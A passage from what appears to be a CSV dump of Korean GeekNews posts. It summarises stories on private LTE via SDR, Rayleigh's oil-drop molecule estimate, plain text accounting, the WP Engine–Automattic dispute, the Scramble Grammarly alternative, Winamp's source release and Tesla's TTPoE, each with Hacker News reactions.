   D&D는 서부극이다 라고 명쾌하게 설명해주신
"
"https://news.hada.io/topic?id=16826","SDR을 활용해서 pLTE 셀룰러 네트워크 구축하기","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      SDR을 활용해서 pLTE 셀룰러 네트워크 구축하기

   Open5GS는 몇년전에 이 곳에서 언급된 적이 있었지만,
   직접 개인이 Open5GS를 사용해서 pLTE (Private LTE)를 구축하고 영상을 올린게 흥미로워서 가져와봤습니다.

   방법은 앞서 언급한 글과 유사하게 SDR을 사용해서 기지국을 구축한 것 같습니다.
   특히, 개인이 LTE 주파수 대역을 쓸 수 있다는게 신기하네요...
"
"https://news.hada.io/topic?id=16911","1870년, 로드 레일리는 기름과 물을 사용하여 분자의 크기를 계산한 연구","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               1870년, 로드 레일리는 기름과 물을 사용하여 분자의 크기를 계산한 연구

    단일 분자의 크기 추정

      벤자민 프랭클린과 레일리 경이 기름과 물만으로 분자의 크기를 계산한 방법

     * 엑스레이가 발견되고 강력한 현미경이 발명되기 수십 년 전, 레일리 경은 기름, 물, 펜만으로 단일 분자의 크기를 계산함
     * 그의 영감은 벤자민 프랭클린에서 비롯됨

      프랭클린의 실험

     * 1770년경 런던을 방문한 프랭클린은 대서양 횡단 중 배에서 기름이 바다에 버려지면 파도가 잔잔해지는 현상을 관찰함
     * 런던의 클라팜 커먼 연못에서 작은 양의 기름을 물에 부어 실험을 진행함
     * 기름이 연못 표면에 빠르게 퍼져 물을 매끄럽게 만드는 것을 확인함
     * 프랭클린은 실험을 여러 번 반복하고 자세히 기록했으나, 분자적 의미를 이해하지 못함

      레일리 경의 재해석

     * 케임브리지 대학의 학자이자 물리학자로 유명한 레일리 경은 프랭클린의 실험을 새로운 관점에서 재해석함
     * 1890년, 레일리 경은 정확히 측정한 소량의 올리브 오일을 물에 떨어뜨리고, 기름이 퍼진 면적을 측정함
     * 기름의 부피를 면적으로 나누어 기름막의 두께를 추정함
     * 기름막이 단일 분자층이라고 가정하여, 기름막의 두께를 한 분자의 길이로 계산함

      레일리 경의 결과

     * 레일리 경의 계산 결과는 약 1.63 나노미터였음
     * 올리브 오일의 주요 성분인 트리아실글리세롤 분자의 실제 길이는 약 1.67 나노미터로, 레일리 경의 추정치는 2% 정도의 오차만 있었음
     * 그의 실험은 단순한 도구로도 깊은 과학적 통찰을 얻을 수 있음을 보여줌

      추가 자료

     * 찰스 탄포드의 책 ""Ben Franklin Stilled the Waves""는 이 기름 방울 실험의 역사를 깊이 있게 탐구함

    GN⁺의 정리

     * 이 기사는 단순한 실험 도구로도 중요한 과학적 발견을 할 수 있음을 보여줌
     * 벤자민 프랭클린과 레일리 경의 실험은 과학적 호기심과 창의성이 얼마나 중요한지를 강조함
     * 이 기사는 과학의 역사와 실험 방법론에 관심 있는 사람들에게 유익할 것임
     * 유사한 기능을 가진 다른 프로젝트로는 ""Science Experiments You Can Do At Home"" 등이 있음

        Hacker News 의견

     * 과학 교육에서 법칙과 이론을 단순히 암기해야 할 것으로 제시하는 경우가 많음
          + 과학 이론이 처음 발견된 이야기가 더 흥미롭고 영감을 줌
          + 생화학 경로를 배웠지만, 그 경로가 어떻게 발견되었는지에 대한 단서가 없었음
          + 다른 과학 이론이 처음 발견된 출판물에 대한 제안을 환영함
     * 1676년 Roemer가 목성의 위성 Io의 궤도를 측정하여 빛의 속도를 추정함
          + 지구가 목성에 접근할 때 Io가 매일 조금 일찍 나타남
          + 지구가 목성에서 멀어질 때 Io가 매일 조금 늦게 나타남
          + 1년 동안 22분의 시간 차이가 발생함
          + 빛이 22분 동안 이동하는 거리를 계산하여 빛의 속도를 227,000 km/s로 추정함
          + 실제 속도는 약 300,000 km/s임
     * Rayleigh가 기름의 부피를 면적으로 나누어 기름막의 두께를 추정함
          + 기름이 단일 분자층을 형성한다고 가정함
          + 기름막의 두께가 하나의 기름 분자의 길이와 같음
          + Rayleigh가 최초로 단일 분자의 크기를 알아냄
     * Millikan & Fletcher의 기름 방울 실험을 떠올리게 함
          + 전자의 전하를 측정한 실험임
          + 미세한 기름 방울의 낙하 시간을 측정하여 부피를 계산함
          + 알려진 전기장을 사용하여 기름 방울을 부양시킴
          + 계산된 전하가 작은 값의 배수로 군집됨
          + 이는 개별 전자의 전하임
     * 기름이 단일 분자 두께로 퍼진다는 가정이 추측에 불과하지 않았는지 의문을 제기함
          + 표면 장력이 기름을 더 두껍게 유지할 가능성에 대한 의문
          + 단일 분자층임을 암시하는 다른 단서가 있었는지 궁금해함
     * 학교에서 ""과학 실험 설계""에 대한 과정을 듣고 싶었음
          + 역사적인 실험 과정을 설명하고 학생들에게 도전 과제를 제시함
          + 지구의 크기를 추정하거나, 플로지스톤과 발광 에테르를 반증하거나, 빛의 속도를 측정하는 실험을 설계하고 실행하는 방법을 배우는 과정임
     * 대학 물리학 수업에서 이 실험을 재현함
          + 많은 작업이 필요했지만 유익하고 흥미로웠음
          + 장비 요구 사항이 학부 물리학 실험실에 적합했음
          + 가능하다면 시도해보기를 강력히 추천함
"
"https://news.hada.io/topic?id=16806","평문 회계 (Plain Text Accounting, PTA)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   평문 회계 (Plain Text Accounting, PTA)

Plain Text Accounting (PTA)

  Plain Text Accounting 소개

     * Plain Text Accounting (PTA)는 텍스트 파일과 명령줄 친화적인 소프트웨어를 사용하여 회계와 부기 작업을 수행하는 방법임
     * 주요 도구로는 Ledger, hledger, Beancount 등이 있음
     * 이 사이트는 PTA 커뮤니티의 도구, 문서 및 실습을 수집하고 있으며, Simon Michael과 기여자들이 유지 관리함

  사이트 맵

     * PTA의 개요, 뉴스 및 토론, 비디오, 슬라이드, 문서, FAQ, 요리책, 소프트웨어 등 다양한 자료를 제공함

  뉴스 및 토론

     * 포럼, 채팅방, 블로그 및 기사, Reddit, Lemmy, Hacker News, Mastodon, Twitter, Stack Exchange 등 다양한 플랫폼에서 PTA 관련 토론이 이루어짐

  비디오

     * 다양한 연사들이 Ledger CLI, 개인 재정 관리, Obsidian을 사용한 지출 추적, Plain Text Accounting의 장점 등을 주제로 발표한 비디오를 제공함

  슬라이드

     * hledger의 아키텍처 투어, Plain Text Accounting 소개, 순수 함수형 개인 재정 관리 등 다양한 주제의 슬라이드를 제공함

  문서

     * 회계 기본, PTA 앱 문서, 비교, 소개, 치트 시트, 요리책, FAQ 등 다양한 문서를 제공함

  소프트웨어

     * PTA 앱, 편집기 플러그인, 데이터 가져오기/변환, 가격 가져오기, 데이터 생성, 워크플로우, 포맷팅, 보고서 작성, 시간 기록, UI 등 다양한 소프트웨어를 제공함

  PTA 앱

     * Ledger, hledger, Beancount 등 다양한 PTA 앱을 소개하고, 각 앱의 시작 시기, 마지막 릴리스, 코드, 커미터 수, 별점, 메일 리스트 크기, 채팅 크기, 이슈 비율 등을 비교함

  편집기 플러그인

     * Atom, Emacs, IntelliJ, Nano, Sublime, TextMate, VIM, VS Code 등 다양한 편집기 플러그인을 제공함

  데이터 가져오기/변환

     * CSV 변환, 다양한 형식의 데이터를 Beancount로 변환하는 도구 등 다양한 데이터 가져오기 및 변환 도구를 제공함

  가격 가져오기

     * Beancount, hledger, Ledger 등 다양한 도구를 사용하여 시장 가격을 가져오는 방법을 제공함

  데이터 생성

     * 가격 거래 생성, 감가상각 거래 생성, 이자 항목 생성 등 다양한 데이터 생성 도구를 제공함

  워크플로우

     * Docker 기반 시스템, CSV 파일에서 hledger 저널 생성, 독일 프리랜서를 위한 시스템 등 다양한 워크플로우 도구를 제공함

  포맷팅

     * Beancount 파일 포맷터, 웹 기반 포맷터 등 다양한 포맷팅 도구를 제공함

  보고서 작성

     * 예산 보고, 개인 자산 분석 앱, hledger 차트 생성 도구 등 다양한 보고서 작성 도구를 제공함

  시간 기록

     * org2tc, taskwarrior, hledger를 사용한 시간 기록 및 보고 도구를 제공함

  UI, 콘솔

     * 인터랙티브 거래 입력 도구, 거래 생성기 등 다양한 콘솔 UI 도구를 제공함

  UI, curses

     * hledger-iadd, hledger-ui, ledger-add 등 다양한 curses UI 도구를 제공함

  UI, GUI

     * Ledgerble, Prudent 등 다양한 GUI 도구를 제공함

  UI, 웹

     * fava, hledger-web, Paisa 등 다양한 웹 UI 도구를 제공함

  UI, 모바일

     * Beancount 모바일 앱, NanoLedger 등 다양한 모바일 UI 도구를 제공함

  라이브러리

     * Beancount 파서, Beancount 확장 등 다양한 라이브러리를 제공함

  유틸리티

     * Beancount 명령줄 도구, hledger-lib 등 다양한 유틸리티를 제공함

  API

     * gledger, hledger-lib, BeanHub API 등 다양한 API를 제공함

GN⁺의 정리

     * Plain Text Accounting은 텍스트 파일과 명령줄 도구를 사용하여 회계 작업을 수행하는 방법으로, Ledger, hledger, Beancount 등의 도구를 사용함
     * 다양한 플랫폼에서 PTA 관련 토론이 이루어지며, 비디오, 슬라이드, 문서 등 다양한 자료를 제공함
     * 다양한 PTA 앱과 편집기 플러그인, 데이터 가져오기/변환 도구, 가격 가져오기 도구 등을 제공하여 사용자들이 쉽게 회계 작업을 수행할 수 있도록 지원함
     * 이 기사는 PTA에 관심이 있는 사람들에게 유용하며, 특히 명령줄 도구를 선호하는 개발자들에게 도움이 될 것임
     * 비슷한 기능을 가진 프로젝트로는 GnuCash, QuickBooks 등이 있음

        Hacker News 의견

     * ledger-cli를 20년 동안 사용해왔음. 완벽하지는 않지만 매우 만족스러움. 모든 것이 평문 텍스트로 되어 있어 스크립트 작성, VIM에서 읽기, 데이터 추출이 용이함. 현재 회사 중 하나의 ledger 파일은 2MB의 평문 텍스트로 2016년 이후의 거래 내역을 포함하고 있음
          + 다양한 ""계정"" (카테고리)에는 큰 가치를 느끼지 못했지만, 모든 것을 추적하는 데 필수적이었음
          + 복식부기 학습이 재미있었고, 평생 유용한 기술임
     * 즉각적인 엄격한 카테고리화 시스템은 일부 사람들에게 맞지 않음. 회사에서 두 단계 접근법을 사용했음
          + 사람이 아이폰 노트에 메모를 작성하고 나중에 스크립트로 날짜를 파싱하고 키워드를 감지하여 복식부기 템플릿을 만듦
          + 스크립트는 외부 ""에이전트""와 내부 분석을 감지하고 원본 텍스트를 주석으로 추가함. 감지되지 않는 항목은 수동으로 카테고리화하고 스크립트에 추가해야 했음
          + 스크립트는 하드코딩된 값이 아닌 편집 가능한 목록을 사용했으며, 이는 사람마다 다르게 설정됨
     * LLM 덕분에 평문 텍스트 회계가 훨씬 쉬워졌음. 은행 명세서를 hledger로 가져오고 수동 입력을 피할 수 있음
          + JSON 파일을 사용해 은행 항목을 hledger 계정에 매핑함. 새로운 거래는 Python 스크립트를 실행해 Claude에게 매핑을 요청함
          + Claude는 매핑을 기반으로 hledger 저널 항목을 반환하며, 이를 빠르게 검토할 수 있음
          + 또 다른 스크립트는 해당 월의 은행 거래에 대한 hledger 저널 항목을 출력함
     * Beancount를 사용해왔으며, 데이터 가져오기 도구를 작성하고 회계를 직접 경험하는 것이 즐거웠음. 하지만 거의 1년 동안 데이터를 가져오지 않았음. 매달 하려고 했지만 30~60분이 걸려 번거로움
     * 평문 텍스트 회계는 멋지지만, 사람들이 은행 데이터를 표준 형식으로 다운로드하는 것이 큰 장벽임
          + 은행은 CSV나 엑셀 파일 이상을 받아들이지 않음. 다양한 데이터 집계 플랫폼(yodlee, plaid 등)은 오픈 소스나 취미 사용자에게 친숙하지 않음
          + 과거에 Wesabe라는 회사가 데스크탑에서 은행 동기화를 했지만, Mint.com이 그들을 사업에서 밀어냈음. 오픈 소스에 적용할 수 있을 것 같음
     * Ledger를 효과적으로 사용하는 방법에 대한 실용적인 ""레시피"" 시리즈를 작성했음
          + 링크
     * 재고(수량, FIFO, 달러 비용 평균)와 송장/POs(AP/AR)를 알고 있는 평문 텍스트 솔루션을 찾고 있음
          + ""차변""과 ""대변"" 같은 단어를 사용했으면 좋겠음. +/− 표기법은 실제 금융 문서나 시나리오에서 평문 텍스트 보고서로 번역하는 것을 어렵게 만듦
     * 다른 사람들이 다양한 평문 텍스트 회계 도구를 어떻게 사용하는지 듣고 싶음
          + 지출 습관을 파악하고 교정 조치를 취하는 데 사용하고 있는지, 단순히 비용, 수익, 순자산 등을 추적하는 데 사용하고 있는지, 아니면 단순히 과정 자체에 대한 것인지 궁금함
          + 평문 텍스트 회계를 생각할 때마다 완전히 몰입하고 싶은 충동이나 이전 시도에 충실하지 못한 것에 대한 죄책감을 느낌. 현재는 주로 죄책감이 있음
     * Ledger의 열렬한 팬이며, 지난 8년 동안 전체 회계 생활을 hledger로 운영해왔음
          + 여러 계정을 너무 많은 파일로 나누지 말고, 계정당 연도별로 하나의 파일을 유지하는 것이 좋음
          + GitHub CoPilot이 ledger 파일 작업에 매우 유용함. 잔액 추가/차감 계산을 거의 완벽하게 수행함
          + 새로운 항목을 수동으로 입력해야 할 때, 종종 단축키 한 줄 주석을 입력하면 전체 항목을 채워줌
"
"https://news.hada.io/topic?id=16920","WP Engine이 Automattic에 "중단 및 금지 명령" 서신을 보냄","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               WP Engine이 Automattic에 ""중단 및 금지 명령"" 서신을 보냄

     * WP Engine은 Automattic과 CEO인 Matt Mullenweg에게 WP Engine에 대한 거짓되고 유해하며 명예를 훼손하는 발언을 중단하고 철회할 것을 요구하는 ""중단 및 금지 명령"" 서신을 보냈음

편지의 내용

     * Automattic CEO인 Matthew Mullenweg가 9월 20일 WordCamp US 기조연설에서 WP Engine에 대해 거짓 주장을 반복적으로 했음
     * Mullenweg는 WP Engine이 Automattic에 거액을 지불하지 않으면 WordPress 커뮤니티 내에서 ""scorched earth nuclear approach""를 취하겠다고 위협했음
     * Mullenweg는 X, YouTube, Wordpress.org 등 여러 공개 플랫폼과 WordPress 관리자 패널을 통해 WP Engine 직원, 고객, 전 세계를 대상으로 WP Engine을 비난하는 거짓 주장을 반복했음
     * Mullenweg는 WordPress 커뮤니티의 이타적 보호자로 가장하면서 WP Engine에게 수천만 달러를 자신의 영리 기업인 Automattic에 넘길 것을 은밀히 요구했음
     * WP Engine의 입장
          + WP Engine은 Mullenweg의 터무니없는 요구에 굴복하지 않을 것이며, 이는 WP Engine과 직원들뿐만 아니라 전체 WordPress 커뮤니티를 위협한다고 주장함
          + WP Engine은 Mullenweg의 부당한 행위에 대해 계속해서 정직하고 성실하게 대응할 것이라고 밝힘
          + WP Engine은 Mullenweg의 언행이 즉각 중단되어야 할 법적 조치 대상이 되는 부당 행위라고 주장함

   WP Engine은 Wordpress가 아닙니다

   이 글에 대한 WP Engine 측의 대응이네요.

        Hacker News 의견

     * WP Engine은 세계 1위의 WordPress 호스팅 서비스라고 주장하지만, 실제로는 WordPress에 기여하는 주요 회사 중 하나가 아님
          + 1.5백만 명의 고객이 있지만, WordPress 개발에 주당 40시간만 기여
          + 연간 4억 달러 이상의 수익을 올리면서도 기여가 적음
     * WP Engine의 법적 대응에 대한 의견
          + WP Engine이 강력한 법적 근거가 있었다면, 처음부터 C&D(중지 및 중단) 요청을 하지 않았을 것이라는 의견
          + C&D의 주요 내용은 Matt Mullenweg의 연설에서 WP Engine을 비판한 부분
     * Matt Mullenweg의 연설에서 WP Engine에 대한 주장
          + WP Engine이 WordPress 생태계를 착취하고 있다는 주장
          + WP Engine 직원들이 WordPress를 지지하면 해고될 수 있다는 주장
          + WP Engine 고객들이 계약을 갱신하지 말아야 한다는 주장
          + 다른 호스팅 서비스로 전환하면 더 빠른 성능을 얻을 수 있다는 주장
          + WP Engine이 상표를 오용하고 있다는 주장
          + WP Engine의 투자자가 오픈 소스 이념에 관심이 없다는 주장
     * 법적 분석
          + (1), (3), (6)번 주장은 의견으로 간주될 가능성이 높음
          + (4)번 주장은 사실일 가능성이 있음
          + (5)번 상표 분쟁 주장은 법적 소송으로 이어질 가능성이 낮음
          + (2)번 직원 보복 주장은 증거가 있다면 WP Engine이 불리할 수 있음
     * Matt Mullenweg의 비판에 대한 반응
          + WP Engine 고객으로서 Matt Mullenweg의 비판이 과도하다고 느꼈음
          + WP Engine이 시장에 진입하지 못한 것에 대한 불만으로 보임
     * WordPress의 취약성에 대한 의견
          + WordPress의 플러그인과 테마 아키텍처가 취약하다는 의견
          + WP Engine이 대규모 WordPress 설치를 안전하게 관리하는 점은 인정받아야 함
          + WordPress의 취약점을 개선하는 데 집중해야 한다는 의견
     * 오픈 소스 소프트웨어 배포와 상표 사용에 대한 비유
          + Mozilla Corporation과 Mozilla Foundation의 예를 들어 상표 사용 정책 설명
          + 상표 사용 정책을 준수하지 않으면 상표 소유자가 조치를 취해야 한다는 의견
     * Matt Mullenweg의 행동에 대한 비판
          + Matt Mullenweg의 행동이 유치하다는 의견
          + 초기 WordPress.org 블로그 게시물이 나빴지만, 인용된 문자 메시지는 더 나빴음
     * 관련 기사 및 링크
          + WP Tavern 기사 링크
          + WP Engine이 WordPress가 아니라는 관련 기사 링크
     * Automattic의 초기 투자와 인수 관련 의견
          + Automattic이 WP Engine에 초기 투자했지만 인수하지 않은 이유에 대한 의문
          + Matt Mullenweg이 오픈 소스 라이선스를 선택한 이유가 돈 때문이라는 의견
"
"https://news.hada.io/topic?id=16832","Scramble - Grammarly 대체 오픈소스 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Scramble - Grammarly 대체 오픈소스

     * AI를 활용하여 브라우저에서 직접 글쓰기를 향상시키는 오픈 소스 Chrome 확장 프로그램
     * Grammarly보다 더 커스터마이징 가능하고 프라이버시를 존중하는 대안으로 설계됨
     * 사용 방법
          + 웹페이지의 텍스트를 선택하고 마우스 오른쪽 버튼을 클릭하여 컨텍스트 메뉴를 엶
          + ""Scramble""을 선택하고 텍스트 향상 옵션을 선택함
          + AI가 텍스트를 처리하고 향상시킬 때까지 기다림

  설치 방법

     * 저장소에서 받아서 ""개발자 모드"" 활성화 하여 설치 가능
     *

     현재 Chrome 웹 스토어에서 검토 중임. 승인되면 그곳에서 설치 가능함

  기본 프롬프트

    1. 철자 및 문법 수정
    2. 글쓰기 향상
    3. 더 전문적으로 만들기
    4. 텍스트 단순화
    5. 텍스트 요약
    6. 텍스트 확장
    7. 글머리 기호로 변환

  API 키

     * 중요: 이 확장 프로그램은 OpenAI API 키가 필요함.
     * 확장 프로그램 설정에서 자신의 API 키를 제공해야 함.

  향후 기능

     * 사용자 정의 프롬프트
     * 추가 언어 모델(LLM) 지원
     * 향상된 컨텍스트 인식
     * 다른 AI 서비스와의 통합
     * 원본과 향상된 텍스트 간의 차이 보기
     * 문법/철자 문제 밑줄 표시
     * 제3자에 의존하지 않는 로컬 LLM

GN⁺의 정리

     * Scramble은 Grammarly의 대안으로, 더 커스터마이징 가능하고 프라이버시를 존중하는 Chrome 확장 프로그램임
     * OpenAI API 키를 사용하여 다양한 텍스트 향상 옵션을 제공함
     * 향후 사용자 정의 프롬프트와 추가 언어 모델 지원 등의 기능이 계획되어 있음
     * 비슷한 기능을 제공하는 다른 프로젝트로는 LanguageTool이 있음

        Hacker News 의견

     * ""Privacy-respecting""을 주장하지만 모든 키 입력이 OpenAI로 전송됨이 끔찍하고 진정으로 불쾌함
          + 저자가 로컬 AI를 추가할 계획이 있다고 답변했음
          + 계획이 그렇다면, 실제로 프라이버시를 존중하는 것으로 간주될 때까지 문구를 수정해야 함
     * OpenAI API를 오픈 소스 소프트웨어라고 부르는 것을 멈춰야 함
     * LanguageTool을 몇 년 동안 사용해 왔음
          + ""구식"" Grammarly의 오픈 소스 대안으로 사용함
          + 텍스트를 더 전문적으로 만드는 AI 기능은 없지만, 자체 호스팅 버전을 제공하여 모든 글을 OpenAI로 보내지 않아도 됨
          + 더 나은 맞춤법/문법 검사기를 원한다면 강력히 추천함
     * Grammarly를 몇 년 동안 사용한 후, 더 간단하고 저렴한 방법을 원했음
          + 그래서 Scramble이라는 Chrome 확장을 만들었음
          + 주요 기능:
               o OpenAI API 키 사용 (100% 로컬)
               o 다양한 개선을 위한 사전 정의된 프롬프트
               o 텍스트를 강조하고 제안을 기다림
               o 현재 GPT-4-turbo에 고정됨
          + 향후 계획: LLM 제공자/모델 선택, 사용자 정의 프롬프트, 버그 수정 및 기본 프롬프트 개선
          + 아마도 버그가 있을 수 있지만 계속 개선할 예정임
          + GitHub: https://github.com/zlwaterfield/scramble
     * Grammarly는 일상적인 글쓰기에서 생명의 은인임
          + 맞춤법과 구두점 수정 또는 재구성 제안만 제공함
          + Grammarly는 너무 잘해서 다른 것과 비교할 수 없음
          + Grammarly의 핵심 기능은 LLM 기반이 아님
          + 최근에 LLM 기능이 추가되었지만, 핵심 기능에 비해 중요하지 않음
          + 이 도구는 다른 ""Grammarly 대안""처럼 내 텍스트를 지나치게 장황하고 영혼 없는 방식으로 재작성하는 또 다른 GPT 래퍼임
          + 적당한 맞춤법 검사기를 기대했음
     * 같은 분야에서 Vale linter를 확인해보기를 추천함
          + 상당히 강력하고 오픈 소스임
          + 백엔드에 의존하지 않음
          + https://vale.sh
     * Scramble은 프라이버시를 존중하지 않는 것 같지만, 내가 작업 중인 프로젝트는 그렇지 않음
          + Harper를 소개함
          + https://github.com/elijah-potter/harper
     * '자신의 키를 가져오라' (BYOK) 접근 방식을 항상 좋아함
          + LLM을 가상 카피 에디터로 사용하는 데 많은 잠재력이 있다고 생각함
          + 글쓰기를 많이 하며, 여러 맞춤형 GPT를 만들어 사용함
          + 첫 번째 GPT는 전문 편집자로서 맞춤법 오류, 문법 문제, 단어 반복 등을 수정하지만 원래의 글쓰기 스타일을 유지해야 함
          + 산책 중에 많은 구술을 하며, 집에 돌아와서 whisper를 실행하고 오디오를 텍스트로 변환한 후 GPT에 던짐
          + GPT가 텍스트를 정리하고 단락으로 구조화함
          + whisper/GPT 덕분에 많은 시간을 절약함
          + 두 번째 GPT는 텍스트를 재구성하고, 연속성 오류를 수정하고, 단어를 교체하여 더 전문적인 톤을 보장하고, 전체 흐름을 개선함
          + 이 GPT는 주로 비즈니스 관련 이메일과 같은 공공 커뮤니케이션에 사용됨
     * 오픈 소스라고 부르기에는 무리가 있음
     * ChatGPT 키 없이 작동하는 동일한 것을 만들었음
          + https://github.com/nucleartux/ai-grammar
"
"https://news.hada.io/topic?id=16917","윈앰프 레거시 플레이어 소스 코드","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           윈앰프 레거시 플레이어 소스 코드

Winamp

  소개

     * Winamp는 1997년에 출시된 멀티미디어 플레이어로, 다양한 오디오 포맷과의 호환성 및 유연성으로 유명함
     * Nullsoft가 개발하였으며, 수백만 명의 사용자들 사이에서 큰 인기를 끌었음
     * 개발이 한동안 중단되었으나, 이제 소스 코드가 공개되어 커뮤니티가 플레이어를 개선하고 현대화할 수 있게 되었음

  사용법

     * Winamp 데스크톱 클라이언트 빌드는 현재 Visual Studio 2019 (VS2019)와 Intel IPP 라이브러리를 기반으로 함
     * Winamp를 빌드하는 방법은 여러 가지가 있음
         1. build_winampAll_2019.cmd 스크립트 파일을 사용하여 x86/x64 (디버그 및 릴리스) 버전 4개를 빌드함. 이 경우 Visual Studio IDE는 실행되지 않음
         2. winampAll_2019.sln 파일을 사용하여 Visual Studio IDE에서 빌드 및 디버그를 수행함

    종속성

     * build_winampAll_2019.cmd 스크립트 파일을 사용하여 x86/x64 (디버그 및 릴리스) 버전 4개를 빌드함. 이 경우 Visual Studio IDE는 실행되지 않음
     * winampAll_2019.sln 파일을 사용하여 Visual Studio IDE에서 빌드 및 디버그를 수행함

      libvpx

     * libvpx는 https://github.com/ShiftMediaProject/libvpx 에서 가져와 수정 후 아카이브로 패킹함
     * unpack_libvpx_v1.8.2_msvc16.cmd를 실행하여 압축을 풀음

      libmpg123

     * libmpg123는 https://www.mpg123.de/download.shtml 에서 가져와 수정 후 아카이브로 패킹함
     * unpack_libmpg123.cmd를 실행하여 dll 파일을 처리함

      OpenSSL

     * openssl-1.0.1u를 사용해야 함
     * 정적 버전의 라이브러리를 빌드하기 위해 build_vs_2019_openssl_x86.cmd와 build_vs_2019_openssl_64.cmd를 실행함
     * OpenSSL을 빌드하려면 7-Zip, NASM, Perl을 설치해야 함

      DirectX 9 SDK

     * DirectX 9 SDK (2010년 6월)를 Microsoft에서 가져와 수정 후 아카이브로 패킹함
     * unpack_microsoft_directx_sdk_2010.cmd를 실행하여 압축을 풀음

      Microsoft ATLMFC lib 수정

     * C:\Program Files (x86)\Microsoft VisualStudio\2019\Community\VC\Tools\MSVC\14.24.28314\atlmfc\include\atltransactionmanager.h 파일의 427번째 줄을 return ::DeleteFile((LPTSTR)lpFileName);에서 return DeleteFile((LPTSTR)lpFileName);로 변경함

      Intel IPP 6.1.1.035

     * Intel IPP 6.1.1.035를 가져와 수정 후 아카이브로 패킹함
     * unpack_intel_ipp_6.1.1.035.cmd를 실행하여 압축을 풀음

GN⁺의 정리

     * Winamp는 다양한 오디오 포맷과의 호환성으로 인해 여전히 많은 사용자들에게 사랑받고 있음
     * 소스 코드가 공개되어 커뮤니티가 플레이어를 개선하고 현대화할 수 있는 기회를 제공함
     * Visual Studio 2019와 여러 라이브러리를 사용하여 빌드할 수 있으며, 다양한 종속성을 처리해야 함
     * Winamp와 유사한 기능을 제공하는 다른 멀티미디어 플레이어로는 VLC Media Player와 foobar2000이 있음

   이슈 보니 라이선스로 말이 많네요

        Hacker News 의견

     * 프로젝트에 기여하는 방법에 대한 의문 제기
          + 라이선스 4조는 프로젝트에 개선, 향상, 버그 수정을 기여하도록 권장함
          + 그러나 5조는 코드 포크나 수정된 버전 배포를 금지함
          + 표준 Github 워크플로우가 라이선스를 위반하게 됨
          + 현재 프로젝트에 참여하지 않는 것이 최선임
          + 라이선스 변경 시 다시 확인할 예정임
     * EFNet의 #mpeg3에서 Justin Frankel과의 추억
          + 앱에 사용할 스킨과 트레이 아이콘을 제작함
          + 크레딧에 이름이 포함됨
     * DMCA 요청과 저작권 문제
          + GitHub에 DMCA 요청을 많이 제출해야 할 것임
          + 포크는 GitHub의 기본 기능임
          + 라이선스가 포크를 허용하지 않음
          + 저작권을 잃을 위험이 있음
          + 법원이 권리 보호를 강력히 요구할 것임
          + GitHub 사용자 경험이 나빠질 것임
     * Winamp와의 개인적인 역사
          + 과거에 인기 있는 플러그인을 작성함
          + Winamp 3의 소스 코드는 C++로 완전히 재작성됨
          + 원래 소스 코드는 Justin Frankel이 C로 작성함
     * 1999년 대학 시절의 MP3 파티
          + CD 디스크 셔플러 대신 MP3 사용
          + Winamp로 음악을 무작위 재생함
          + 음악이 끊기지 않고 파티를 즐김
          + Winamp에 감사함
     * 혼란스러운 오픈 소싱
          + 소프트웨어 오픈 소싱이 매우 혼란스러움
     * 간편한 음악 플레이어
          + 경쟁자들보다 간편한 인터페이스를 가짐
          + 불필요한 그래픽 없이 기능을 수행함
     * ""오픈""이라는 용어의 왜곡
          + 라이선스 조건이 재배포나 재판매를 허용하지 않음
          + ""오픈 소스""가 아닌 ""소스 사용 가능""이라고 부르는 것이 맞음
     * SHOUTcast 서버 소프트웨어의 불법 공유
          + 리포지토리에 불법적으로 공유된 코드가 있음
"
"https://news.hada.io/topic?id=16902","Tesla Transport Protocol over Ethernet (TTPoE)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Tesla Transport Protocol over Ethernet (TTPoE)

     * Tesla는 HotChips 2024에서 Tesla Transport Protocol over Ethernet (TTPoE)를 오픈 소스로 공개함
     * 테슬라는 Ultra Ethernet Consortium (UEC)에 합류하여 이 프로토콜을 공유하고 AI/ML/데이터센터를 위한 새로운 고속/저지연 패브릭을 표준화하기 위해 노력중
     * TTPoE는 비독점적이고, 저비용이며, 분산 혼잡 제어, 표준 EthernetII 프레임, 비중앙집중식 상호 연결 프로토콜을 지향함
     * TTPoE의 특징
          + TCP와 마찬가지로 패킷 손실과 재전송이 허용되지만, 전체 전송이 보장됨
          + TTPoE의 초기 배포는 Tesla Dojo v1 프로젝트에서 이루어졌음
               o 프로토콜이 전적으로 하드웨어에서 실행되며 수만 개 이상의 동시 엔드포인트가 있는 초대형 멀티 엑사플롭스(fp16) 슈퍼컴퓨터에 배포됨
          + 이 프로토콜은 CPU나 OS의 개입 없이 링크를 설정하고 실행할 수 있음
     * 이 프로토콜은 복잡하거나 똘똘한 것이 아니라 기본 원칙에 기반을 둠
          + 이더넷 전송은 본질적으로 A에서 B로 데이터를 이동시키는 것이며, 물리적 한계에 의해서만 제한되어야 함
          + 매우 큰 규모의 시스템에서 중앙 집중식 혼잡 관리는 어리석은 시도이며, 각 엔드포인트는 탄력적이고 자체 관리되어야 함

GN⁺의 의견

     * TTPoE는 고성능 컴퓨팅 환경에서 기존의 TCP 프로토콜이 가진 한계를 극복하기 위한 흥미로운 시도임
     * 하드웨어 오프로딩과 단순화된 상태 머신을 통해 지연 시간을 최소화하고 처리량을 극대화하는 것이 주요 목표로 보임
     * TTPoE는 AI와 ML 분야에서 데이터 전송 속도와 지연 시간을 개선할 수 있는 잠재력이 있음
     * Tesla가 이 프로토콜을 오픈 소스로 공개한 것은 HPC 분야에서 혁신을 가속화하는 데 도움이 될 것임
     * 다만 TTPoE가 범용 네트워크에서 TCP를 완전히 대체하기는 어려울 것으로 보이며, 고품질의 전용 네트워크에 최적화된 솔루션임. TTPoE가 널리 채택되기 위해서는 표준화와 생태계 구축이 중요할 것임
     * 유사한 기능을 가진 프로토콜로는 RoCE (RDMA over Converged Ethernet)와 NVLink가 있음

   TTPoE 에 대해서 좀 더 자세히 설명한 다른 기사가 있네요
   Tesla’s TTPoE at Hot Chips 2024: Replacing TCP for Low Latency Applications

TTPoE 개요

     * Tesla는 Hot Chips 2023에서 Dojo 슈퍼컴퓨터를 소개했으며, 자율주행 자동차와 같은 자동차 응용 분야에 중점을 둔 기계 학습에 사용함
